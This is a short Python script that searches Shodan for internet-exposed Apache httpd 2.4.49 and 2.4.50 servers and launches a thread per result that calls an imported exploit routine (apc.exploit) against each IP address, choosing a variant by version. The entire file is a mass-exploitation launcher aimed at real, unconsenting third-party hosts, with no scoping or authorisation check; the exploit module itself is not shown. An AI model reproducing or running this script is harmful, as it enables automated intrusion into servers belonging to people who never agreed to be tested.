import shodan
from threading import Thread
import apc


SHODAN_API_KEY = 'YOUR SHODAN API'
api = shodan.Shodan(SHODAN_API_KEY)
query = "product:\"Apache httpd\" version:\"2.4.49, 2.4.50\""
print("Query:", query)
for banner in api.search_cursor(query):
    th = Thread(target=apc.exploit, args=(banner['ip_str'], 0)) if '2.4.49' in banner['version'] else Thread(target=apc.exploit, args=(banner['ip_str'], 1))
    th.daemon= True
    th.start()
